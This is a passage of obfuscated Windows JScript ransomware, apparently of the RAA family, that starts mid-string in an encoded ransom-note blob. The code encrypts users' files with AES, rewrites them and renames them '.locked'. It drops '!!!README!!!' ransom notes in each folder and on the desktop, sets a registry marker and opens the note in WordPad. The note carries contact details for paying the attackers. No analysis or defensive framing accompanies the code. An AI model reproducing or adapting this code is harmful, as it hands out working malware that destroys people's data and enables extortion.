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";
        var cUNSPAqZAE = rftKZajp.replace(/RAASEP/g, "A");
        cUNSPAqZAE = CryptoJS.enc.Base64.parse(cUNSPAqZAE);
        cUNSPAqZAE = cUNSPAqZAE.toString(CryptoJS.enc.Utf8);
        cUNSPAqZAE = cUNSPAqZAE.replace(/=IDHERE=/g, cVjZujcP);
        cUNSPAqZAE = cUNSPAqZAE.replace(/=ADRHERE=/g, jOnaTnksWb);
        return cUNSPAqZAE;
    }

////B5wuifgCBCGVNwK4KpV73UnytdTkDjsoqIxFdmAUq7Ze0Dlib1p644VFSsCvaqV6RbnncZn7Des7RMPnmvDLBS3KjuDNzDOORh5lZMS1SXf45KcT8RfUhgRG6QDzmu5O8XNGv07kfDbHdjy3j4WKNNVoN5Yq5R3Hga7EYeJEwmUiH9kBaVambgPIzWGjAHJ5HeidAhoigHPFxbeS0MIAnJUhToN6pRHOli2rpwYyB9Hg1Ip9HHHu3oKy6wbA9NrCJ7xUg8opTyWx0i6IUBBB8E0guo5GT9v6T1K86acnLT1jspSthsc8XugqnFUVclnhQ28iqBT7hgL3DdoYMkT3zZQy3ROcPrBFVAnqkXHy8YCNxsxAqxS23cFT2Up7KbJZvyyXNUTsjZ9q8As0Qbom7kOE4G8fVnGCm2JAAoVX8mbm56AzPLPZRlvRhZ2g2IboLWgad8Tfu5wQjwnCQBzjifVh7U0ELdDqbGZdy89J2d5wBFAf9Ug4byTMrwp7xwWSumgpp31Kqb8gexFSCLliiI89lbPKU3jd5ovEKLpzwANdSe8rA1kGmAKy6yvbstWeeuShPfC4fmRFV4oz6sby1ADz7o7MpBseLR9KG2c1bbpPlr6Y6JGOs8M4gdujYHFdpgF6GLYTOGZfBatrC5SAru0EFeD3nIuZmIErs0vrnqEkn2h8Vvi8k0eczt0PxXVp7zwQ2xkV475J4iK2ZEbX0nrWMTiXg82mRP5Bep8mU0ayTbyQ4DJiQoJlfKmwXwsnvMlaOPPZCM5UNAJQc9Mo4H5F8yTIwdDJBDREkNY2EupL8f9gxtgtR1Erzf04V9dKfY51IBtYuX6QQd4vIjsGpTbVzjsKPKxx27YXHM3uLgi4seSf0Pj144rU5FQzAkQS30FoKr5pJDlItNjORTypPlo6Mmh4bv1GT1zCaqwcGFVKnmqe6gL2guzU
    function YlDrqb(kth) {
        var gg = new ActiveXObject("Scripting.FileSystemObject");
        var dir = kth + "!!!README!!!" + __key + ".rtf";
        var d2 = gg.CreateTextFile(dir, true);
        d2.Write(VGCDtihB());
        d2.Close();
        return 0;
    }

    function iKTzQKbfDJs() {
        var mItZKEXYwE = [];
        mItZKEXYwE = kAgTDYi[0];
        mItZKEXYwE = OFTEml(mItZKEXYwE);
        var rjTvWjMKnGpI = -1;
        do {
            rjTvWjMKnGpI += 1;
            YlDrqb(mItZKEXYwE[rjTvWjMKnGpI]);
        } while (rjTvWjMKnGpI < mItZKEXYwE.length - 1);
        return 0
    }

    iKTzQKbfDJs();
    kAgTDYi[1] = [];
    function nXmsNjMpKTv(kAgTDYi) {
        var EPtLPm = -1;
        var wVgUUZeM = -1;
        do {
            EPtLPm += 1;
            var LeDOaP = LMz(kAgTDYi[0][EPtLPm]);
            var LeDOaP = LeDOaP.split(__key);
            kAgTDYi[1] = kAgTDYi[1].concat(LeDOaP);
            kAgTDYi[1] = OFTEml(kAgTDYi[1]);
            var aZKH = HHiAp(kAgTDYi[0][EPtLPm]);
            var aZKH = aZKH.split(__key);
            kAgTDYi[0] = kAgTDYi[0].concat(aZKH);
            kAgTDYi[0] = OFTEml(kAgTDYi[0]);
        } while (EPtLPm <= kAgTDYi[0].length - 2);
        return (kAgTDYi[1]);
    }

    function PLnEyqCPKHV() {
        var sNaZfrOWc = nXmsNjMpKTv(kAgTDYi);
        var NBMCuybDY = -1;
        iFIS:do {
            NBMCuybDY += 1;
            try {
                KWgwJwOlqJcs(sNaZfrOWc[NBMCuybDY]);
            } catch (e) {
                continue iFIS;
            }
        } while (NBMCuybDY <= sNaZfrOWc.length - 2);
        return 0
    }

    PLnEyqCPKHV();
    function KWgwJwOlqJcs(IMhTname) {
        function rStinsVp(rand) {
            var eqQu = [];
            var EPtLPmand = -1;
            do {
                EPtLPmand += 1;
                eqQu[EPtLPmand] = Math.floor((Math.random() * 2000) + 1);
                if (eqQu[EPtLPmand] < 10) {
                    eqQu[EPtLPmand] = "000" + eqQu[EPtLPmand];
                } else if (eqQu[EPtLPmand] >= 10 && eqQu[EPtLPmand] < 100) {
                    eqQu[EPtLPmand] = "00" + eqQu[EPtLPmand];
                } else if (eqQu[EPtLPmand] >= 100 && eqQu[EPtLPmand] < 1000) {
                    eqQu[EPtLPmand] = "0" + eqQu[EPtLPmand];
                } else {
                    eqQu[EPtLPmand] = eqQu[EPtLPmand];
                }
            } while (eqQu.length < 32);
            var xjLCtcIO = "";
            var EPtLPmand2 = -1;
            var vPdyagHuFMMj = [];
            do {
                EPtLPmand2 += 1;
                vPdyagHuFMMj[EPtLPmand2] = parseInt(eqQu[EPtLPmand2]);
                xjLCtcIO = xjLCtcIO + rand.charAt(vPdyagHuFMMj[EPtLPmand2]);
            } while (xjLCtcIO.length < 32);
            var gieJISwveNlD = [];
            gieJISwveNlD[0] = eqQu;
            gieJISwveNlD[1] = xjLCtcIO;
            return gieJISwveNlD;
        }

        var HZtSmFNRdJM_data = rStinsVp(VKw);
        var qPCIyff = rStinsVp(VKw);
////cWO7h7UOQEdvc9GiXfI7h2j00qzhHNh03qS4qJXfoQyWniUmqpKHaoPNTEYwSY3H2IVazY1nJbmfpKKyj9fNWAwPcrwVPxiE04yYjYwnxP
        function udpIHxNm(IMhTname) {
            var SlSPWu = WScript.CreateObject("ADODB.Stream");
            SlSPWu.CharSet = '437';
            SlSPWu.Open();
            SlSPWu.LoadFromFile(IMhTname);
            var hXpHGpZ = [];
            hXpHGpZ[0] = [];
            hXpHGpZ[1] = [];
            var PRuJZyAvfeza = SlSPWu.Size;
            if (PRuJZyAvfeza > 6122 && PRuJZyAvfeza < 5000000) {
                var GinRqOjln = OQlYdejWlC(2000, 2040);
                hXpHGpZ[0][0] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
                var kWsAN = Math.floor(PRuJZyAvfeza / 2) - 3060;
                hXpHGpZ[1][0] = SlSPWu.ReadText(kWsAN) + "RAA-SEP";
                hXpHGpZ[0][1] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
                var iPZDBPG = PRuJZyAvfeza - (SlSPWu.Position + GinRqOjln);
                hXpHGpZ[1][1] = SlSPWu.ReadText(iPZDBPG) + "RAA-SEP";
                hXpHGpZ[0][2] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
                SlSPWu.Close;
                jMvqmKSQu(hXpHGpZ);
            } else if (PRuJZyAvfeza > 5000000 && PRuJZyAvfeza <= 500000000) {
                qqJ(IMhTname)
            } else if (PRuJZyAvfeza <= 6122) {
                hXpHGpZ[0][0] = SlSPWu.ReadText;
                SlSPWu.Close;
                jMvqmKSQu(hXpHGpZ);
            } else {
                hXpHGpZ = 0;
                SlSPWu.Close;
                jMvqmKSQu(hXpHGpZ);
            }
            return 0;
        }

        udpIHxNm(IMhTname);
        function qqJ(IMhTname) {
            var SlSPWu = WScript.CreateObject("ADODB.Stream");
            SlSPWu.CharSet = '437';
            SlSPWu.Open();
            SlSPWu.LoadFromFile(IMhTname);
            var FhDYKCTNZFu = WScript.CreateObject("ADODB.Stream");
            FhDYKCTNZFu.CharSet = '437';
            FhDYKCTNZFu.Open();
            var GinRqOjln = OQlYdejWlC(90000, 125000);
            var PRuJZyAvfeza = SlSPWu.Size;
            var VVe = SlSPWu.ReadText(GinRqOjln);
            var cBKyRXWGPWBs = ukBnxEOtjm(VVe);
            cBKyRXWGPWBs = String(cBKyRXWGPWBs);
            var rMkTeqZm = cBKyRXWGPWBs.length;
            SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
            var ECgBWYtoib = SlSPWu.ReadText(GinRqOjln);
            var AblANuF = ukBnxEOtjm(ECgBWYtoib);
            AblANuF = String(AblANuF);
            var QfYmGGcYOFB = AblANuF.length;
            var IJDZ = ",";
            SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
            SlSPWu.SetEOS;
            SlSPWu.WriteText(cBKyRXWGPWBs);
            SlSPWu.WriteText(AblANuF);
            SlSPWu.WriteText(rMkTeqZm);
            SlSPWu.WriteText(IJDZ);
            SlSPWu.WriteText(QfYmGGcYOFB);
            SlSPWu.WriteText(IJDZ);
            var ids = "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=3";
            SlSPWu.WriteText(ids);
            SlSPWu.Position = GinRqOjln;
            SlSPWu.CopyTo(FhDYKCTNZFu);
            SlSPWu.Close;
            FhDYKCTNZFu.SaveToFile(IMhTname, 2);
            FhDYKCTNZFu.Close;
            var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
            DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
            return 0;
        }

////jbnqLZNJJU8MXxfoAGPcb113j4K1XQ9IZWi4jg0f9sU3koQYuP0SF6ueN09SHxD8wbODMwlbiIkVALIpWt54jq6
        function jMvqmKSQu(hXpHGpZ) {
            if (hXpHGpZ[1].length != 0) {
                var DftonCbPCyQR = hXpHGpZ[0].join("");
                DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
                DftonCbPCyQR = DftonCbPCyQR + "=END=OF=HEADER=";
                DftonCbPCyQR = DftonCbPCyQR + hXpHGpZ[1].join("") + "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=1";
                omaDplUyHou(DftonCbPCyQR);
            } else if (hXpHGpZ == 0) {
                var DftonCbPCyQR = 0;
                omaDplUyHou(DftonCbPCyQR);
            } else {
                var DftonCbPCyQR = hXpHGpZ[0][0];
                DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
                DftonCbPCyQR = DftonCbPCyQR + "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=2";
                omaDplUyHou(DftonCbPCyQR);
            }
            return DftonCbPCyQR;
        }

        function ukBnxEOtjm(EQs) {
            var HZtSmFNRdJM = HZtSmFNRdJM_data[1];
            var gmCRXSMsLyM = qPCIyff[1];
            EQs = CryptoJS.AES.encrypt(EQs, HZtSmFNRdJM, {gmCRXSMsLyM: gmCRXSMsLyM});
            return EQs;
        }

        function omaDplUyHou(lsYZxzUm) {
            var IxC = new ActiveXObject('ADODB.Stream');
            IxC.Type = 2;
            IxC.Charset = "437";
            IxC.Open();
            if (lsYZxzUm != 0) {
                IxC.WriteText(lsYZxzUm);
                IxC.SaveToFile(IMhTname, 2);
                IxC.Close();
                var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
                DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
            } else {
                IxC.Close();
            }
            return 0;
        }

        return 0;
    }

    var FYSAj = WScript.CreateObject("WScript.Shell");
    FYSAj.RegWrite("HKCU\\RAA\\Raa-fnl\\", "beenFinished", "REG_SZ");
    var IvTV = "C:\\" + "!!!README!!!" + __key + ".rtf";
    var xfejSVYO = new ActiveXObject("Scripting.FileSystemObject");
    var Nnz = FYSAj.SpecialFolders("Desktop");
    Nnz = Nnz += "\\";
    xfejSVYO.CopyFile(IvTV, Nnz);
    var rdm_fl = "wordpad.exe" + " " + IvTV;
    FYSAj.Run(rdm_fl, 3);
    return 0;
}
////rRamKSjsNz39gPKfRVOI5odPXta4NIJBgMvz8yTUCcEAQOGdTkOSwFvHNbaeP5mXi9m0WO1zpEVsudHB2Gyyn59roJ7eOhWogKvJCI8sFVLUdpcxz2WXwMFeZjB0yBy2qMTrVBNrvZPF7Jpplovdmuw0HZ8DmxnU0pBBQr5iierAt6kKMN0lxvgDdLAHdwzBmo7utAUXF66zv7dTn2G1lq3opV9jzuDqxbUJCp4BPXkP8dfgfRvrjHA5Aif4f4NyLSoGqgGvBK
